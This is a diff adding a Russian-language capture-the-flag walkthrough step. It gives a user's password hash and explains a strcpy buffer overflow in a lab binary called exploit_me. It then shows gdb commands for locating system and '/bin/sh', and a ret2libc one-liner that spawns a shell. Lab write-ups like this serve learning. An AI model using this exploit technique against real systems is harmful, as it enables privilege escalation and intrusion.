@@ -1,1 +1,18 @@
-Тут будут шаги от бомбы
+Получаем слово SLASH
+Получаем хэш по md5: 646da671ca01bb5d84dbb5fb2238dc8e, это и есть пароль для zaz.
+Видим файл exploit_me. Название намекает, что его надо взломать.
+Это бинарник, который принимает аргумент и печатает его.
+Через gdb можем посмотреть, что создаётся буфер размером 144, и в него копируется аргумент через strcpy.
+Можем использовать ret2lib exploit. Для этого надо переполнить буфер и поместить в регистр eip адрес
+команды system и в качестве аргумента передать адрес строки '/bin/sh'
+
+gdb exploit_me
+    break main
+    run
+    print &system                           > 0xb7e6b060 > '\xb7\xe6\xb0\x60'
+    find &system, +9999999, "/bin/sh"       > 0xb7f8cc58 > '\xb7\xf8\xcc\x58'
+
+./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'aaaa' + '\xb7\xf8\xcc\x58'[::-1])")
+
+Подробное описание эксплойта.
+https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
